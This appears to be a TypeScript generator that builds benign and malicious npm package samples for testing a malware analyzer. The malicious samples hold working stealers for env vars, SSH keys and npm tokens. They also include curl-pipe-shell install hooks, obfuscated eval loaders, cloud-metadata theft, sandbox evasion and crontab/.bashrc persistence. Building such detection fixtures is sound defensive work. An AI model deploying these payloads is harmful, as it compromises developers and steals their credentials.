/**
 * 样本包生成器。
 *
 * 自己写 ustar 打包,而不是调用系统 tar:这样才能精确构造
 * 路径穿越、绝对路径符号链接、可执行位等"恶意归档结构",
 * 同时保证输出稳定(固定 mtime、排序),适合反复运行。
 *
 *   npm run samples   → samples/packages/*.tgz
 */

import { gzipSync } from 'node:zlib';
import { mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { join, dirname } from 'node:path';

const OUT_DIR = join(__dirname, '..', '..', 'samples', 'packages');

export interface SampleFile {
  path: string;
  content?: string | Buffer;
  mode?: number;
  /** 符号链接目标;给出时 content 忽略 */
  symlink?: string;
  /** 硬链接目标 */
  hardlink?: string;
}

export interface SamplePackage {
  /** tarball 文件名(不含 .tgz) */
  fileName: string;
  packageJson: Record<string, unknown>;
  files: SampleFile[];
  /** 直接塞进归档、不经 package/ 前缀规范化的原始条目 */
  rawEntries?: Array<{ name: string; content: string | Buffer; mode?: number; typeflag?: string; linkname?: string }>;
}

// ── ustar 写入 ───────────────────────────────────────────────────

function octal(value: number, width: number): string {
  return value.toString(8).padStart(width - 1, '0') + '\0';
}

function writeString(buf: Buffer, value: string, offset: number, length: number): void {
  const bytes = Buffer.from(value, 'utf8');
  bytes.copy(buf, offset, 0, Math.min(bytes.length, length));
}

function header(name: string, size: number, mode: number, typeflag: string, linkname = ''): Buffer {
  const buf = Buffer.alloc(512);
  writeString(buf, name, 0, 100);
  writeString(buf, octal(mode, 8), 100, 8);
  writeString(buf, octal(0, 8), 108, 8); // uid
  writeString(buf, octal(0, 8), 116, 8); // gid
  writeString(buf, octal(size, 12), 124, 12);
  writeString(buf, octal(1734566400, 12), 136, 12); // 2024-12-19,fixed mtime
  buf.fill(0x20, 148, 156); // checksum 占位
  writeString(buf, typeflag, 156, 1);
  writeString(buf, linkname, 157, 100);
  writeString(buf, 'ustar\0', 257, 6);
  writeString(buf, '00', 263, 2);

  let sum = 0;
  for (const b of buf) sum += b;
  writeString(buf, octal(sum, 7) + ' ', 148, 8);
  return buf;
}

function entry(name: string, content: Buffer, mode: number, typeflag = '0', linkname = ''): Buffer {
  const data = Buffer.alloc(Math.ceil(content.length / 512) * 512);
  content.copy(data);
  return Buffer.concat([header(name, content.length, mode, typeflag, linkname), typeflag === '0' ? data : Buffer.alloc(0)]);
}

function buildTarball(pkg: SamplePackage): Buffer {
  const chunks: Buffer[] = [];
  const pkgJson = Buffer.from(`${JSON.stringify(pkg.packageJson, null, 2)}\n`, 'utf8');
  chunks.push(entry('package/package.json', pkgJson, 0o644));

  for (const file of pkg.files) {
    const fullPath = `package/${file.path}`;
    const mode = file.mode ?? 0o644;
    if (file.symlink !== undefined) {
      chunks.push(entry(fullPath, Buffer.alloc(0), mode, '2', file.symlink));
      continue;
    }
    if (file.hardlink !== undefined) {
      chunks.push(entry(fullPath, Buffer.alloc(0), mode, '1', file.hardlink));
      continue;
    }
    const content = typeof file.content === 'string' ? Buffer.from(file.content, 'utf8') : file.content ?? Buffer.alloc(0);
    chunks.push(entry(fullPath, content, mode));
  }

  for (const raw of pkg.rawEntries ?? []) {
    const content = typeof raw.content === 'string' ? Buffer.from(raw.content, 'utf8') : raw.content;
    chunks.push(entry(raw.name, content, raw.mode ?? 0o644, raw.typeflag ?? '0', raw.linkname ?? ''));
  }

  chunks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(chunks), { level: 9 });
}

// ── 共用的恶意载荷片段 ──────────────────────────────────────────

/** 一个基于 base64 的窃密载荷:读 env + ~/.ssh,POST 到 webhook */
const EXFIL_PAYLOAD = `
const os = require('os');
const fs = require('fs');
const https = require('https');
function collect() {
  const out = { env: JSON.stringify(process.env), npm: '' , ssh: '' };
  try { out.npm = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8'); } catch (e) {}
  try { out.ssh = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8'); } catch (e) {}
  return out;
}
const body = collect();
const req = https.request({ hostname: 'webhook.site', path: '/8f3a-2b', method: 'POST', headers: { 'content-type': 'application/json' } }, () => {});
req.end(JSON.stringify(body));
`;

function b64(text: string): string {
  return Buffer.from(text, 'utf8').toString('base64');
}

/** 生成 charCode 数组写法 */
function charCodes(text: string, perLine = 16): string {
  const codes = [...text].map((c) => c.charCodeAt(0));
  const lines: string[] = [];
  for (let i = 0; i < codes.length; i += perLine) lines.push(`  ${codes.slice(i, i + perLine).join(', ')}`);
  return `[\n${lines.join(',\n')}\n]`;
}

/** 生成 \x 转义串 */
function hexEscaped(text: string): string {
  return [...Buffer.from(text, 'utf8')].map((b) => `\\x${b.toString(16).padStart(2, '0')}`).join('');
}

// ── 样本定义 ───────────────────────────────────────────────────

export const SAMPLES: SamplePackage[] = [
  // 1. 完全正常的工具库
  {
    fileName: 'clean-string-utils-1.2.0',
    packageJson: {
      name: 'str-utils-lite',
      version: '1.2.0',
      description: 'Small string helpers with no install scripts',
      license: 'MIT',
      main: 'index.js',
      files: ['index.js', 'README.md'],
    },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
function camelCase(input) {
  return input.replace(/[-_\\s]+(.)?/g, (_, c) => (c ? c.toUpperCase() : ''));
}
function slugify(input) {
  return input.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
}
module.exports = { camelCase, slugify };
`,
      },
      { path: 'README.md', content: '# str-utils-lite\n\nTwo tiny helpers.\n' },
      {
        path: 'test/slugify.test.js',
        content: `const assert = require('assert');
const { slugify } = require('../index');
assert.strictEqual(slugify('Hello World'), 'hello-world');
`,
      },
    ],
  },

  // 2. 有合法 install 脚本、读 env 但只是配置
  {
    fileName: 'clean-with-build-2.0.1',
    packageJson: {
      name: 'native-config-loader',
      version: '2.0.1',
      description: 'Loads config and runs a local codegen step',
      license: 'Apache-2.0',
      main: 'dist/index.js',
      scripts: { postinstall: 'node scripts/build.js' },
      dependencies: { debug: '^4.3.4' },
    },
    files: [
      {
        path: 'scripts/build.js',
        content: `'use strict';
// 合法的postinstall:只生成本地文件
const fs = require('fs');
const path = require('path');
const outDir = path.join(__dirname, '..', 'dist');
fs.mkdirSync(outDir, { recursive: true });
fs.writeFileSync(path.join(outDir, 'build-info.json'), JSON.stringify({ built: true }));
console.log('build done');
`,
      },
      {
        path: 'dist/index.js',
        content: `'use strict';
const debug = require('debug')('native-config-loader');
const os = require('os');
function loadConfig() {
  const home = os.homedir();
  const env = process.env.APP_ENV || 'development';
  debug('loading config for', env, 'at', home);
  return { env, home };
}
module.exports = { loadConfig };
`,
      },
      { path: 'README.md', content: '# native-config-loader\n' },
    ],
  },

  // 3. postinstall 直接 curl | sh —— 最经典
  {
    fileName: 'evil-postinstall-curl-1.0.4',
    packageJson: {
      name: 'color-helpers-pro',
      version: '1.0.4',
      description: 'Color helpers (fork)',
      scripts: { postinstall: 'curl -fsSL http://45.13.22.9/setup.sh | sh' },
    },
    files: [
      {
        path: 'index.js',
        content: `module.exports = { red: (s) => '\\u001b[31m' + s + '\\u001b[0m' };\n`,
      },
    ],
  },

  // 4. postinstall 里用 node -e + base64 隐藏命令
  {
    fileName: 'evil-postinstall-b64-1.1.0',
    packageJson: {
      name: 'eslint-plugin-secure',
      version: '1.1.0',
      scripts: {
        postinstall: `node -e "eval(Buffer.from('${b64(
          `require('child_process').execSync('curl -s https://evil.example.io/i.sh | bash', {stdio:'inherit'})`,
        )}','base64').toString())"`,
      },
    },
    files: [{ path: 'index.js', content: `module.exports = { rules: {} };\n` }],
  },

  // 5. 库本体做环境变量 + SSH 外发
  {
    fileName: 'evil-env-exfil-3.2.1',
    packageJson: {
      name: 'analytics-sdk-lite',
      version: '3.2.1',
      main: 'index.js',
      description: 'Lightweight analytics client',
    },
    files: [{ path: 'index.js', content: EXFIL_PAYLOAD }],
  },

  // 6. base64 + eval 的混淆
  {
    fileName: 'evil-obfuscated-b64-2.0.0',
    packageJson: { name: 'fast-json-parse', version: '2.0.0', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
const _payload = '${b64(EXFIL_PAYLOAD)}';
const _decode = Buffer.from(_payload, 'base64').toString('utf8');
(0, eval)(_decode);
module.exports = { parse: JSON.parse };
`,
      },
    ],
  },

  // 7. 十六进制转义
  {
    fileName: 'evil-hex-escape-1.0.9',
    packageJson: { name: 'tiny-duration', version: '1.0.9', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `var s = "${hexEscaped(`require('https').get('https://199.99.12.4/p?x='+process.env.NPM_TOKEN)`)}";
eval(s);
`,
      },
    ],
  },

  // 8. String.fromCharCode + eval
  {
    fileName: 'evil-charcode-1.3.3',
    packageJson: { name: 'is-odd-plus', version: '1.3.3', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `var p = String.fromCharCode(${charCodes(`require('child_process').exec('curl -s http://evil.example.io/run | sh')`).trim()});
eval(p);
`,
      },
    ],
  },

  // 9. 远端拉取后 eval
  {
    fileName: 'evil-remote-eval-0.9.1',
    packageJson: { name: 'fetch-retry-lite', version: '0.9.1', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
const https = require('https');
https.get('https://raw.githubusercontent.example.invalid/x/main/payload.js', (res) => {
  let body = '';
  res.on('data', (c) => (body += c));
  res.on('end', () => { eval(body); });
});
module.exports = {};
`,
      },
    ],
  },

  // 10. 字符数组 + reverse + join
  {
    fileName: 'evil-array-reverse-2.2.0',
    packageJson: { name: 'array-flatten-lite', version: '2.2.0', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `const code = '${b64(`require('child_process').execSync('id > /tmp/pwned')`)}'
const parts = code.split('');
const decoded = parts.reverse().join('');
eval(Buffer.from(decoded, 'base64').toString());
`,
      },
    ],
  },

  // 11. 归档结构恶意:路径穿越 + 外部符号链接 + 二进制
  {
    fileName: 'evil-archive-structure-1.0.0',
    packageJson: { name: 'harmless-logger', version: '1.0.0', main: 'index.js' },
    files: [
      { path: 'index.js', content: `module.exports = { log: console.log };\n` },
      { path: 'payload.sh', content: '#!/bin/sh\ncurl -s http://evil.example/x | sh\n', mode: 0o755 },
      {
        path: 'dist/prebuild.node',
        content: Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00]),
      },
      { path: 'escape-link', symlink: '../../../etc/passwd' },
    ],
    rawEntries: [
      { name: '../outside/evil.js', content: `require('fs').writeFileSync('/tmp/x','y')` },
      { name: '/abs/path/evil2.js', content: `eval('1+1')` },
    ],
  },

  // 12. 云元数据窃取 + typo-squat 名字
  {
    fileName: 'evil-typosquat-metadata-1.0.0',
    packageJson: { name: 'expres', version: '1.0.0', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `const http = require('http');
const req = http.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/', (res) => {
  let d = '';
  res.on('data', (c) => (d += c));
  res.on('end', () => {
    https.post('https://attacker.example.invalid/collect', d);
  });
});
module.exports = {};
`,
      },
    ],
  },

  // 13. 版本差分对:正常 → 被投毒
  {
    fileName: 'diffpkg-1.0.0',
    packageJson: { name: 'csv-parser-lite', version: '1.0.0', main: 'index.js', description: 'CSV parser' },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
function parse(line) { return line.split(','); }
module.exports = { parse };
`,
      },
      { path: 'README.md', content: '# csv-parser-lite\n' },
    ],
  },
  {
    fileName: 'diffpkg-1.0.1',
    packageJson: {
      name: 'csv-parser-lite',
      version: '1.0.1',
      main: 'index.js',
      description: 'CSV parser',
      scripts: { postinstall: 'node setup.js' },
      dependencies: { 'csv-parser-lite': '^1.0.0' },
    },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
function parse(line) { return line.split(','); }
module.exports = { parse };
`,
      },
      {
        path: 'setup.js',
        content: `'use strict';
const https = require('https');
const os = require('os');
const fs = require('fs');
const token = process.env.NPM_TOKEN || '';
let ssh = '';
let npmrc = '';
try { ssh = fs.readFileSync(os.homedir() + '/.ssh/id_ed25519', 'utf8'); } catch (e) {}
try { npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8'); } catch (e) {}
const payload = JSON.stringify({ env: process.env, ssh, npmrc });
https.get('https://collect.example.invalid/v1?t=' + token, () => {});
const req = https.request({ hostname: 'webhook.site', path: '/8f3a-2b', method: 'POST' }, () => {});
req.end(payload);
`,
      },
      { path: 'README.md', content: '# csv-parser-lite\n' },
    ],
  },

  // 14. 差分对:两个版本都干净,只有新功能
  {
    fileName: 'benign-evolve-1.0.0',
    packageJson: { name: 'tiny-slug', version: '1.0.0', main: 'index.js' },
    files: [{ path: 'index.js', content: `module.exports = (s) => s.toLowerCase().replace(/ /g, '-');\n` }],
  },
  {
    fileName: 'benign-evolve-2.0.0',
    packageJson: { name: 'tiny-slug', version: '2.0.0', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
module.exports = (s, opts = {}) => s.toLowerCase().replace(/[^a-z0-9]+/g, opts.sep || '-');
`,
      },
    ],
  },

  // 15. 反分析 + 延时执行
  {
    fileName: 'evil-sandbox-detect-1.4.0',
    packageJson: { name: 'perf-timer-pro', version: '1.4.0', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
const fs = require('fs');
function inSandbox() {
  try {
    if (fs.existsSync('/.dockerenv')) return true;
    if (fs.readFileSync('/proc/1/cgroup', 'utf8').includes('docker')) return true;
  } catch (e) {}
  return process.env.CI === 'true';
}
if (!inSandbox()) {
  setTimeout(() => {
    require('child_process').exec('curl -s https://evil.example.io/stage2 | sh');
  }, 65000);
}
module.exports = { now: () => Date.now() };
`,
      },
    ],
  },

  // 16. 大量"看起来可疑但完全合法"的常见写法 —— 误报回归样本
  {
    fileName: 'clean-tricky-patterns-1.5.0',
    packageJson: { name: 'color-support-lite', version: '1.5.0', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
// 常见库里的合法写法集合,分析器不应把它们判成恶意
const process_ = require('process');

// 1) 全局对象 shim(babel/webpack 运行时常见)
const root = (typeof globalThis === 'object' && globalThis) || Function('return this')();

// 2) unicode 正则表(lodash/ansi-regex 风格)
const rsAstralRange = '\\ud800-\\udfff';
const reRegional = '(?:\\ud83c[\\udde6-\\uddff]){2}';
const unicodeEscapeTable = { '\\u00c0': 'A', '\\u00e1': 'a', '\\u00e7': 'C' };

// 3) 空白字符表(semver 风格)
const WHITESPACE_CHARACTERS = ['\\t', '\\n', '\\v', '\\f', '\\r', ' ', '\\u00a0', '\\u1680', '\\u2000'];

// 4) 只枚举环境变量名(debug 库读 DEBUG 前缀)
const envKeys = Object.keys(process.env);

// 5) 只读单个配置项
const debugName = process_.env.DEBUG || '';

// 6) 检测 CI(支持 CI 彩色输出的库都这么做)
function isCi() {
  const { env } = process_;
  if ('CI' in env) return true;
  return ['GITHUB_ACTIONS', 'GITLAB_CI', 'CIRCLECI'].some((k) => k in env);
}

// 7) CLI 的 --help 处理
function cli(argv) {
  if (argv.indexOf('--help') >= 0) {
    console.log('usage: color-support-lite');
    process_.exit(0);
  }
  return 0;
}

// 8) 模板引擎式的动态 Function(lodash template / 各类编译器)
function compile(source) {
  return Function('obj', 'return obj.' + source);
}

// 9) 写包内缓存文件
const fs = require('fs');
const path = require('path');
function cache(data) {
  fs.writeFileSync(path.join(__dirname, '.cache.json'), JSON.stringify(data));
}

module.exports = { root, isCi, cli, compile, cache, envKeys, debugName, reRegional };
`,
      },
      {
        path: 'test/readme.test.md',
        content: `# Docs

Example: run \`curl -fsSL https://example.com | sh\` only if you trust it.
Also \`require('http').get(...)\` in examples is fine — it's documentation.
`,
      },
      {
        path: 'types/index.d.ts',
        content: `export declare function isCi(): boolean;
export declare function compile(source: string): (obj: unknown) => unknown;
`,
      },
      {
        path: 'bin/cli.js',
        content: `#!/usr/bin/env node\nrequire('../index').cli(process.argv.slice(2));\n`,
        mode: 0o755,
      },
    ],
  },

  // 16b. 纯"下载后执行"——没有 eval,但等价 RCE
  {
    fileName: 'evil-download-exec-1.2.0',
    packageJson: { name: 'tiny-metrics', version: '1.2.0', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
const { execSync } = require('child_process');
execSync('curl -fsSL https://cdn.example.invalid/install.sh | bash', { stdio: 'inherit' });
module.exports = {};
`,
      },
    ],
  },

  // 17. 压缩产物(minified)—— 短标识符 + 长字符串,但无危险行为
  {
    fileName: 'clean-minified-2.1.0',
    packageJson: { name: 'minified-math-lite', version: '2.1.0', main: 'index.min.js' },
    files: [
      {
        path: 'index.min.js',
        content: `!function(n){"use strict";function t(n,t){return n+t}function e(n,t){return n*t}function r(n){return n<0?-n:n}function o(n,t,e){return t?t(n):e?e(n):n}var u=Array.prototype.slice,i=Object.create,a=Array.isArray;n.sum=t,n.mul=e,n.abs=r,n.wrap=o}(this);
`,
      },
    ],
  },

  // 18. 合法的 HTTP 客户端库:有网络、有 env 读取,但只读自己的 API key
  {
    fileName: 'clean-http-client-4.0.0',
    packageJson: { name: 'tiny-api-client', version: '4.0.0', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
const https = require('https');
const apiKey = process.env.TINY_API_KEY || '';
function request(path, cb) {
  return https.get('https://api.tiny.example.com/v1' + path, { headers: { authorization: 'Bearer ' + apiKey } }, cb);
}
module.exports = { request };
`,
      },
    ],
  },

  // 19. npm 配置篡改 + 持久化
  {
    fileName: 'evil-persistence-1.0.2',
    packageJson: { name: 'dotenv-extended-plus', version: '1.0.2', main: 'index.js' },
    files: [
      {
        path: 'index.js',
        content: `'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
fs.writeFileSync(path.join(os.homedir(), '.npmrc'), 'registry=https://evil.example.invalid/\\nignore-scripts=false\\n');
fs.appendFileSync(path.join(os.homedir(), '.bashrc'), '\\ncurl -s https://evil.example.invalid/a | sh\\n');
require('child_process').exec('crontab -l | { cat; echo "@reboot curl -s https://evil.example.invalid/b | sh"; } | crontab -');
module.exports = {};
`,
      },
    ],
  },
];

function main(): void {
  rmSync(OUT_DIR, { recursive: true, force: true });
  mkdirSync(OUT_DIR, { recursive: true });
  for (const sample of SAMPLES) {
    const tarball = buildTarball(sample);
    const outPath = join(OUT_DIR, `${sample.fileName}.tgz`);
    mkdirSync(dirname(outPath), { recursive: true });
    writeFileSync(outPath, tarball);
    process.stdout.write(`wrote ${outPath} (${tarball.length} bytes)\n`);
  }
  process.stdout.write(`\n${SAMPLES.length} sample packages in ${OUT_DIR}\n`);
}

if (require.main === module) main();

export { buildTarball, EXFIL_PAYLOAD };
